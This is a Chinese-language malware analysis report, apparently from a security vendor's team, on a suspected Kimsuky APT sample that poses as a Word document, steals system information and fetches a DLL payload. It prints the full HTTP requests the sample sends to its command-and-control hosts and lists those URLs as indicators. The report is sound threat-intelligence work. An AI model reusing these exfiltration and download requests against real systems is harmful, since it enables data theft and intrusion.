> 原文链接: https://www.anquanke.com//post/id/216589 


# 疑似 KimsukyAPT 组织最新攻击活动样本分析


                                阅读量   
                                **109869**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t012840823171012311.jpg)](https://p4.ssl.qhimg.com/t012840823171012311.jpg)



作者：kczwa1@知道创宇NDR团队

## 概述：

KimsukyAPT 是一个长期活跃的 APT 攻击组织，一直针对于韩国的智囊团,政府组织,新闻组织,大学教授等等进行活动.并且该组织拥有多平台的攻击能力,载荷便捷,阶段繁多。

知道创宇NDR团队监测发现，该组织最近半年异常活跃。近日，知道创宇NDR产品团队在日常的样本追踪过程中发现了疑似该组织最新的攻击样本。



## 样本信息一：

Md5 ：adc39a303e9f77185758587875097bb6<br>
最早于9.2日上传于virustotal

[![](https://p3.ssl.qhimg.com/t01927ff3fc2655bf63.png)](https://p3.ssl.qhimg.com/t01927ff3fc2655bf63.png)

该样本为伪装为word文件图标的pe文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2020/09/cba52661-cb10-4409-98b7-bf57890b7393.png-w331s)

## 样本分析

进入主函数后读取资源“JUYFON”。

[![](https://p1.ssl.qhimg.com/t012db6b24d30b1b9fa.png)](https://p1.ssl.qhimg.com/t012db6b24d30b1b9fa.png)

查看文件资源“JUYFON”应该为一段加密后的数据。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ad9b0b2bdeeafff3.png)

读取该资源段后通过简单的解密获取内容：

[![](https://p5.ssl.qhimg.com/t011a4053aa051bc32b.png)](https://p5.ssl.qhimg.com/t011a4053aa051bc32b.png)

后创建文件并解密后的内容写入新创建的文件：

[![](https://p2.ssl.qhimg.com/t01d99d71d1ee6ebf14.png)](https://p2.ssl.qhimg.com/t01d99d71d1ee6ebf14.png)

通过调试获取创建的文件名：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cb8e0f23eefb6376.png)

[![](https://p0.ssl.qhimg.com/t01e9225544a2390d30.png)](https://p0.ssl.qhimg.com/t01e9225544a2390d30.png)

创建文件后打开该文件，为一个伪装的doc文件，起到迷惑受害者的作用：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ff66df0908a8d451.png)

经过翻译后为跟韩国某学校相关的文档：

[![](https://p5.ssl.qhimg.com/t019703e075bc80220e.png)](https://p5.ssl.qhimg.com/t019703e075bc80220e.png)

随后启动一个线程：

[![](https://p3.ssl.qhimg.com/t019e94aa2a99a3b0d5.png)](https://p3.ssl.qhimg.com/t019e94aa2a99a3b0d5.png)

该线程中主要包含3个函数404250，4049e0，4045c0。

[![](https://p0.ssl.qhimg.com/t01bc9d1f53d2fa0fe1.png)](https://p0.ssl.qhimg.com/t01bc9d1f53d2fa0fe1.png)

404250：

[![](https://p3.ssl.qhimg.com/t01abf3828a40f8f4aa.png)](https://p3.ssl.qhimg.com/t01abf3828a40f8f4aa.png)

生成临时目录文件wcl.doc：

[![](https://p1.ssl.qhimg.com/t01738dadda73603e02.png)](https://p1.ssl.qhimg.com/t01738dadda73603e02.png)

生成临时文件名tcf.bin以备后续使用。

[![](https://p3.ssl.qhimg.com/t010b49b4beae433444.png)](https://p3.ssl.qhimg.com/t010b49b4beae433444.png)

通过cmd命令将窃取的本地计算机信息写入wcl.doc:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d42d274c0dfad4e1.png)

[![](https://p3.ssl.qhimg.com/t0144667c209d5babcd.png)](https://p3.ssl.qhimg.com/t0144667c209d5babcd.png)

Wcl.doc完成生成后格式如下，主要包含系统临时文件，系统信息等：

[![](https://p5.ssl.qhimg.com/t01c4fde581a59996d2.png)](https://p5.ssl.qhimg.com/t01c4fde581a59996d2.png)

4049e0：

此函数主要功能是读取上一步生成的本地计算机信息，并发送给远控端。

[![](https://p4.ssl.qhimg.com/t01dce9e7109fa2be7a.png)](https://p4.ssl.qhimg.com/t01dce9e7109fa2be7a.png)

此处包含一些迷惑调试器的代码，如图4bca处：

[![](https://p5.ssl.qhimg.com/t015db1ec616b4ce91e.png)](https://p5.ssl.qhimg.com/t015db1ec616b4ce91e.png)

但在IDA中可以正常识别：

[![](https://p5.ssl.qhimg.com/t01d4b5e0ab3a1667e1.png)](https://p5.ssl.qhimg.com/t01d4b5e0ab3a1667e1.png)

由于eax=0，nop word ptr「eax」操作无意义，因此在OD中选择delete analysis后继续单步调试即可：

[![](https://p4.ssl.qhimg.com/t01131e95c0f38fac72.png)](https://p4.ssl.qhimg.com/t01131e95c0f38fac72.png)

构造好的post body内容如下，包括分割符及加密后的前面窃取的计算机信息文件。

[![](https://p2.ssl.qhimg.com/t015d06607b3e03c52e.png)](https://p2.ssl.qhimg.com/t015d06607b3e03c52e.png)

其中404dd0主要功能是通过http协议将窃取的计算机信息发送到pingguo2.atwbpage.com

[![](https://p3.ssl.qhimg.com/t01352523119f3d7a01.png)](https://p3.ssl.qhimg.com/t01352523119f3d7a01.png)

[![](https://p1.ssl.qhimg.com/t01d71a31114e8a0667.png)](https://p1.ssl.qhimg.com/t01d71a31114e8a0667.png)

完整的post请求如下：

```
POST /home/jpg/post.php HTTP/1.1 Accept: */* Host: pingguo2.atwebpages.com Referer: http://pingguo2.atwebpages.comhome/jpg/post.php Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhpFxMBe19cSjFnG Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Content-Length: 5571 Connection: Keep-Alive Cache-Control: no-cache

pingguo2.atwebpages.com/pingguo2.atwebpages.com
```

[![](https://p3.ssl.qhimg.com/t0184c9761c9731c24d.png)](https://p3.ssl.qhimg.com/t0184c9761c9731c24d.png)

```
POST /home/jpg/post.php HTTP/1.1 Accept: */* Host: pingguo2.atwebpages.com Referer: http://pingguo2.atwebpages.comhome/jpg/post.php Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhpFxMBe19cSjFnG Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Content-Length: 5571 Connection: Keep-Alive Cache-Control: no-cache

pingguo2.atwebpages.com/home/jpg/post.php
```

4045c0:

首先构造get请求，从服务器上读取文件：

[![](https://p0.ssl.qhimg.com/t0108d04654d0687276.png)](https://p0.ssl.qhimg.com/t0108d04654d0687276.png)

完成的请求如下：

```
GET /home/jpg/download.php?filename=button01 HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 Host: pingguo2.atwebpages.com Cache-Control: no-cache

pingguo2.atwebpages.com/home/jpg/download.php?filename=button01
```

经过测试，发现该请求无法获取相应：

[![](https://p1.ssl.qhimg.com/t0120b73e7700e2a818.png)](https://p1.ssl.qhimg.com/t0120b73e7700e2a818.png)

分析代码后发现会将从服务器上读取的文件写入之前创建的临时文件tcf.bin，并将起用loadlibrary加载，因此可以判断tcf.bin应该是一个有更复杂功能的dll木马文件，且load该dll并没有去call 其他导出函数，猜测该dll的恶意代码都在dllmain里面。

[![](https://p1.ssl.qhimg.com/t010b6bc618b46c1149.png)](https://p1.ssl.qhimg.com/t010b6bc618b46c1149.png)

[![](https://p1.ssl.qhimg.com/t0130030ab3ccd325d9.png)](https://p1.ssl.qhimg.com/t0130030ab3ccd325d9.png)

同时可以关联到另外一个样本。

#### <a class="reference-link" name="%E6%A0%B7%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>样本信息

Md5 28833e121bb77c8262996af1f2aeef55<br>
此样本上传时间稍早，代码结构完成一致，粗略分析仅两处与上一个样本不同：

1.生产的迷惑文件文字不同：

[![](https://p4.ssl.qhimg.com/t0112d458e0b7768c37.png)](https://p4.ssl.qhimg.com/t0112d458e0b7768c37.png)

2.c2服务器的域名及url不同：

[![](https://p0.ssl.qhimg.com/t01936d5c7dce7504af.png)](https://p0.ssl.qhimg.com/t01936d5c7dce7504af.png)

#### <a class="reference-link" name="%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90"></a>关联分析

由于2个样本种都使用了相同的字符串作为post的分隔符：

WebKitFormBoundarywhpFxMBe19cSjFnG.通过搜索引擎检索，会得到如下的结果：

[![](https://p1.ssl.qhimg.com/t01740cb04acb9d19a0.png)](https://p1.ssl.qhimg.com/t01740cb04acb9d19a0.png)

可以看到这段字符串在很久以前就出现并且曾被用于针对韩国冬奥会的攻击,并且Kimsuky攻击活动中曾经使用过，同时结合样本的掩护文档的内容，可以确定被攻击者目标是韩国大学相关人士，完全符合以往Kimsuky的攻击意图，因此可以断定此样本的来源大概率是Kimsuky。



## 总结

通过分析可以看出最新的样本依然有多阶段方便攻击者重新组合攻击工具的特点，目前知道创宇NDR流量监测产品已经支持对次APT攻击活动的精准检测：

[![](https://p0.ssl.qhimg.com/t01e9f0a60aefe01e53.png)](https://p0.ssl.qhimg.com/t01e9f0a60aefe01e53.png)



## IOC

### <a class="reference-link" name="MD5:"></a>MD5:

adc39a303e9f77185758587875097bb6<br>
28833e121bb77c8262996af1f2aeef55

### <a class="reference-link" name="URL%EF%BC%9A"></a>URL：

portable.epizy.com/img/png/post.php<br>
portable.epizy.com/img/png/download.php?filename=images01<br>
pingguo2.atwebpages.com/home/jpg/download.php?filename=button01<br>
pingguo2.atwebpages.com/home/jpg/post.php
